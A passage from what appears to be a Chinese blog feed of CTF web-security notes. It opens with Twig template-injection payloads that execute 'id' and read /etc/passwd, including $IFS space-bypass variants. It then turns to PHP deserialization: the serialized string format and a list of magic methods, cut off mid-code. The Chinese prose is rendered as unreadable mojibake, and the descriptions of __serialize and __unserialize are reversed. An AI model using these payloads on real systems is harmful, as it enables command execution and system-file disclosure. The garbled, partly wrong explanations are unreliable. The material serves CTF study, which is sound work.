class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//è¿™ä¸¤ä¸ªä¸€èµ·çš„</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;id&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;cat\x20/etc/passwd&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;[<span class="hljs-string">&#x27;cat$IFS/etc/passwd&#x27;</span>]<span class="hljs-punctuation">|</span><span class="hljs-keyword">filter</span>(<span class="hljs-string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><pre><code class="hljs"></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>SSTI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web py</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—åŒ–</title>
    <link href="/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-å±æ€§å’Œæƒé™"><a href="#PHP-å±æ€§å’Œæƒé™" class="headerlink" title="PHP å±æ€§å’Œæƒé™"></a>PHP å±æ€§å’Œæƒé™</h1><ul><li><p><strong>å±æ€§çš„æƒé™ï¼Œå¯ä»¥åˆ†ä¸ºï¼š</strong></p><ol><li><code>public</code> æƒé™ å¤–éƒ¨å¯ä»¥é€šè¿‡ç®­å¤´è®¿é—®åˆ°</li><li><code>private</code> æƒé™ å†…éƒ¨é€šè¿‡ <code>$this-&gt;username</code> è®¿é—®åˆ°</li><li><code>protected</code> æƒé™ è¡¨ç¤º è‡ªèº«åŠå…¶å­ç±» å’Œçˆ¶ç±» èƒ½å¤Ÿè®¿é—®</li></ol></li><li><p><strong>æŠ½è±¡ç±»</strong></p><ul><li>ä¸èƒ½è¢« <code>new</code>ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è¢«ç›´æ¥å®ä¾‹åŒ–å¯¹è±¡</li></ul></li><li><p><strong>æ¥å£ <code>interface</code></strong></p><ul><li>ä¸ºäº†å®ç°å¤šç»§æ‰¿æ•ˆæœ</li><li><code>implements</code> å¯ä»¥å®ç°å¤šä¸ªæ¥å£</li></ul></li><li><p><strong>æ–¹æ³•çš„å±æ€§ä¿®é¥°ç¬¦</strong></p><ul><li><code>public</code></li><li><code>private</code></li><li><code>protected</code></li></ul></li><li><p><strong>ä¿®é¥°ï¼š</strong></p><ul><li>é™æ€å±æ€§ <code>static</code></li><li><code>final</code> å±æ€§ <code>final</code></li></ul></li></ul><h1 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1><ul><li>å¦‚æœå±æ€§æƒé™ä¸º <code>private</code>ï¼Œé‚£ä¹ˆåºåˆ—åŒ–åï¼Œå­˜å‚¨çš„å±æ€§åå­—ä¸º <code>%00+ç±»å+%00+å±æ€§å</code></li><li>å¦‚æœå±æ€§æƒé™ä¸º <code>protected</code>ï¼Œé‚£ä¹ˆåºåˆ—åŒ–åï¼Œå­˜å‚¨çš„å±æ€§åå­—ä¸º <code>%00+*+%00+å±æ€§å</code></li><li>åºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªå¯¹è±¡å˜ä¸ºä¸€ä¸ªå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸² <code>serialize(å¯¹è±¡)</code> è¿”å›åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</li><li>ååºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²å˜ä¸ºä¸€ä¸ªå¯ä»¥è°ƒç”¨çš„å¯¹è±¡ <code>unserialize(ååºåˆ—åŒ–åçš„å­—ç¬¦ä¸²)</code> è¿”å›å¯¹è±¡</li></ul><h3 id="ååºåˆ—åŒ–ç¤ºä¾‹ï¼š"><a href="#ååºåˆ—åŒ–ç¤ºä¾‹ï¼š" class="headerlink" title="ååºåˆ—åŒ–ç¤ºä¾‹ï¼š"></a>ååºåˆ—åŒ–ç¤ºä¾‹ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;John Doe&quot;</span>;<br>s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;address&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Address&quot;</span>:<span class="hljs-number">2</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;city&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;New York&quot;</span>;<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;zip&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;10001&quot;</span>;<br> &#125;<br> s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;phoneNumbers&quot;</span>;a:<span class="hljs-number">2</span>:&#123;<br> i:<span class="hljs-number">0</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;123-456-7890&quot;</span>;<br> i:<span class="hljs-number">1</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;098-765-4321&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>ååºåˆ—åŒ–æ—¶ï¼ŒPHPä¼šåšä»¥ä¸‹æ“ä½œï¼š</strong><ol><li>æ‰¾åˆ°ååºåˆ—åŒ–å­—ç¬¦ä¸²è§„å®šçš„ç±»åå­— </li><li>å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œä½†ä¸ä¼šè°ƒç”¨æ„é€ æ–¹æ³•</li><li>æœ‰äº†å®ä¾‹åŒ–çš„ç±»å¯¹è±¡ï¼Œå¯¹å®ƒçš„å±æ€§è¿›è¡Œèµ‹å€¼</li><li>æ‰§è¡Œé­”æœ¯æ–¹æ³• <code>__wakeup()</code> å’Œ <code>__unserialize()</code></li><li>è¿”å›æ„é€ å¥½çš„å¯¹è±¡</li></ol></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Address</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$city</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zip</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$city</span>, <span class="hljs-variable">$zip</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;city = <span class="hljs-variable">$city</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;zip = <span class="hljs-variable">$zip</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$address</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phoneNumbers</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$address</span>, <span class="hljs-variable">$phoneNumbers</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;address = <span class="hljs-variable">$address</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;phoneNumbers = <span class="hljs-variable">$phoneNumbers</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$address</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">&quot;New York&quot;</span>, <span class="hljs-string">&quot;10001&quot;</span>);<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-variable">$address</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;123-456-7890&quot;</span>, <span class="hljs-string">&quot;098-765-4321&quot;</span>));<br><span class="hljs-variable">$serializedData</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serializedData</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p><strong>ç»“æœæ˜¯ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">3</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;John Doe&quot;</span>;<br>s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;address&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Address&quot;</span>:<span class="hljs-number">2</span>:&#123;<br>s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;city&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;New York&quot;</span>;<br>s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;zip&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;10001&quot;</span>;<br> &#125;<br> s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;phoneNumbers&quot;</span>;a:<span class="hljs-number">2</span>:&#123;<br> i:<span class="hljs-number">0</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;123-456-7890&quot;</span>;<br> i:<span class="hljs-number">1</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;098-765-4321&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>è§£è¯»åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</strong></p><ol><li><p><strong>è¯†åˆ«å¤–å±‚å¯¹è±¡ï¼š</strong></p><ul><li><code>O:4:&quot;User&quot;:3:</code></li><li><code>O</code> è¡¨ç¤ºå¯¹è±¡ï¼ˆObjectï¼‰ã€‚</li><li><code>4</code> è¡¨ç¤ºç±»åé•¿åº¦ã€‚</li><li><code>&quot;User&quot;</code> æ˜¯ç±»åã€‚</li><li><code>3</code> è¡¨ç¤ºå¯¹è±¡çš„å±æ€§æ•°é‡ã€‚</li></ul></li><li><p><strong>è§£æå¯¹è±¡å±æ€§ï¼š</strong></p><ul><li><code>&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;s:12:&quot;phoneNumbers&quot;;a:2:&#123;i:0;s:12:&quot;123-456-7890&quot;;i:1;s:12:&quot;098-765-4321&quot;;&#125;&#125;</code></li><li>è§£æç¬¬ä¸€ä¸ªå±æ€§ï¼š<ul><li><code>s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;</code></li></ul></li><li>è§£æç¬¬äºŒä¸ªå±æ€§ï¼š<ul><li><code>s:7:&quot;address&quot;;O:7:&quot;Address&quot;:2:&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code></li><li><code>s:7:&quot;address&quot;</code> è¡¨ç¤ºå­—ç¬¦ä¸²å±æ€§åï¼Œé•¿åº¦ä¸º 7ï¼Œå†…å®¹æ˜¯ â€œaddressâ€</li><li><code>O:7:&quot;Address&quot;:2:</code> è¡¨ç¤ºä¸€ä¸ªåµŒå¥—çš„ Address å¯¹è±¡</li><li><code>&#123;s:4:&quot;city&quot;;s:8:&quot;New York&quot;;s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;&#125;</code> åŒ…å«äº† Address å¯¹è±¡çš„å±æ€§ã€‚</li><li><code>s:4:&quot;city&quot;;s:8:&quot;New York&quot;;</code> è¡¨ç¤º Address å¯¹è±¡çš„ç¬¬ä¸€ä¸ªå±æ€§ã€‚</li><li><code>s:4:&quot;city&quot;</code> è¡¨ç¤ºå­—ç¬¦ä¸²å±æ€§åï¼Œé•¿åº¦ä¸º 4ï¼Œå†…å®¹æ˜¯ â€œcityâ€ã€‚</li><li><code>s:8:&quot;New York&quot;</code> è¡¨ç¤ºå­—ç¬¦ä¸²å±æ€§å€¼ï¼Œé•¿åº¦ä¸º 8ï¼Œå†…å®¹æ˜¯ â€œNew Yorkâ€ã€‚</li><li><code>s:3:&quot;zip&quot;;s:5:&quot;10001&quot;;</code> è¡¨ç¤º Address å¯¹è±¡çš„ç¬¬äºŒä¸ªå±æ€§ã€‚</li><li><code>s:3:&quot;zip&quot;</code> è¡¨ç¤ºå­—ç¬¦ä¸²å±æ€§åï¼Œé•¿åº¦ä¸º 3ï¼Œå†…å®¹æ˜¯ â€œzipâ€ã€‚</li><li><code>s:5:&quot;10001&quot;</code> è¡¨ç¤ºå­—ç¬¦ä¸²å±æ€§å€¼ï¼Œé•¿åº¦ä¸º 5ï¼Œå†…å®¹æ˜¯ â€œ10001â€ã€‚</li></ul></li></ul></li></ol></li><li><p><strong><code>$this</code>è§£é‡Šä¸ºå½“å‰å¯¹è±¡é‡Œçš„ï¼š</strong></p><ul><li><code>__construct</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</li><li><code>__destruct</code>ï¼šå½“ PHP è„šæœ¬æ‰§è¡Œç»“æŸå‰ä¸€ç§’å½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯å‰è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é‡Šæ”¾å¯¹è±¡å ç”¨çš„èµ„æºã€‚</li><li><code>__call</code>ï¼šåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°åŠ¨æ€æ–¹æ³•è°ƒç”¨ã€‚</li><li><code>__callStatic</code>ï¼šåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°åŠ¨æ€é™æ€æ–¹æ³•è°ƒç”¨ã€‚</li><li><code>__get</code>ï¼šå½“è¯»å–ï¼ˆ<code>echo</code>ï¼‰è®¿é—®ï¼ˆ<code>$myObject-&gt;age;</code>ï¼‰ä¸€ä¸ªä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶ï¼Œ<code>__get</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</li><li><code>__set</code>ï¼šå½“è®¾ç½®ï¼ˆèµ‹å€¼ï¼‰ä¸€ä¸ªä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§æ—¶ï¼Œ<code>__set</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</li><li><code>__isset</code>ï¼šå½“ä½¿ç”¨ <code>isset()</code> æˆ– <code>empty()</code> æµ‹è¯•ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ˜¯å¦å­˜åœ¨æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</li><li><code>__unset</code>ï¼šå½“ä½¿ç”¨ <code>unset()</code> åˆ é™¤ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å±æ€§çš„è®¿é—®æ§åˆ¶ã€‚</li><li><code>__toString</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²æ—¶ï¼ˆ<code>echo $myObject;</code>ï¼‰ï¼ˆ<code>preg_match</code>æ—¶ï¼‰è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</li><li><code>__invoke</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«ä½œä¸ºå‡½æ•°è°ƒç”¨<code>$myObject(&#39;ChatGPT&#39;);</code>è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å¯è°ƒç”¨æ€§ã€‚</li><li><code>__set_state</code>ï¼šå½“ä½¿ç”¨ <code>var_export()</code> å¯¼å‡ºä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</li><li><code>__clone</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å…‹éš†æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å®ç°å¯¹è±¡çš„å…‹éš†ã€‚</li><li><code>__debugInfo</code>ï¼šå½“ä½¿ç”¨ <code>var_dump()</code> æˆ– <code>print_r()</code> è¾“å‡ºä¸€ä¸ªå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å¯¹è±¡çš„è°ƒè¯•ä¿¡æ¯è¾“å‡ºã€‚</li><li><code>__sleep</code>ï¼šåœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å“ªäº›å±æ€§è¢«åºåˆ—åŒ–ã€‚</li><li><code>__wakeup</code>ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥é‡æ–°åˆå§‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</li><li><code>__unserialize()</code> æ˜¯ PHP 7.4 ä¸­å¼•å…¥çš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå°†å¯¹è±¡åºåˆ—åŒ–ä¸ºæ•°ç»„ï¼ŒåŒæ—¶åœ¨åºåˆ—åŒ–æ—¶å¯¹æ•æ„Ÿæ•°æ®ï¼ˆå¦‚å¯†ç ï¼‰è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚åœ¨PHP7.4.0å¼€å§‹ï¼Œå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† <code>__unserialize()</code> å’Œ <code>__wakeup()</code> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ã€‚</li><li><code>__serialize()</code> æ–¹æ³•ï¼šååºåˆ—åŒ–æ—¶ï¼Œä»æ•°ç»„ä¸­æ¢å¤å¯¹è±¡çŠ¶æ€ï¼Œå¹¶å¯¹æ•æ„Ÿæ•°æ®ï¼ˆå¦‚å¯†ç ï¼‰è¿›è¡Œè§£å¯†å¤„ç†ã€‚ä½¿ç”¨ <code>serialize()</code> å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œ<code>__serialize()</code> æ–¹æ³•è¢«è°ƒç”¨ï¼Œå¹¶å°†å±æ€§æ‰“åŒ…ä¸ºæ•°ç»„ã€‚</li></ul></li></ul><hr><h3 id="è¿™é‡Œæ˜¯è¢«è°ƒç”¨çš„ä¾‹å­"><a href="#è¿™é‡Œæ˜¯è¢«è°ƒç”¨çš„ä¾‹å­" class="headerlink" title="è¿™é‡Œæ˜¯è¢«è°ƒç”¨çš„ä¾‹å­"></a>è¿™é‡Œæ˜¯è¢«è°ƒç”¨çš„ä¾‹å­</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br><br>    <span class="hljs-comment">// __set() æ–¹æ³•åœ¨ç»™ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è®¾ç½®å±æ€§ &#x27;<span class="hljs-subst">$name</span>&#x27; ä¸º &#x27;<span class="hljs-subst">$value</span>&#x27;ã€‚&quot;</span> . PHP_EOL;      <span class="hljs-comment">//è®¾ç½®å±æ€§ &#x27;name&#x27; ä¸º &#x27;ChatGPT&#x27;ã€‚</span><br>        <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// __get() æ–¹æ³•åœ¨è®¿é—®ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$this</span>-&gt;data)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è®¿é—®å±æ€§ &#x27;<span class="hljs-subst">$name</span>&#x27;ï¼Œå€¼ä¸ºï¼š&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>] . PHP_EOL;    <span class="hljs-comment">//è®¿é—®å±æ€§ &#x27;name&#x27;ï¼Œå€¼ä¸ºï¼šChatGPT</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å±æ€§ &#x27;<span class="hljs-subst">$name</span>&#x27; ä¸å­˜åœ¨ã€‚&quot;</span> . PHP_EOL;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>]);<br>&#125;<br><br><span class="hljs-comment">// __unset() æ–¹æ³•ï¼Œç”¨äºåˆ é™¤å±æ€§</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>])) &#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å±æ€§ &#x27;<span class="hljs-subst">$name</span>&#x27; å·²è¢«åˆ é™¤ã€‚&quot;</span> . PHP_EOL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å±æ€§ &#x27;<span class="hljs-subst">$name</span>&#x27; ä¸å­˜åœ¨ã€‚&quot;</span> . PHP_EOL;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;å¯¹è±¡çš„åç§°æ˜¯ï¼š&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br><span class="hljs-comment">// __invoke() æ–¹æ³•ä¼šåœ¨å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span 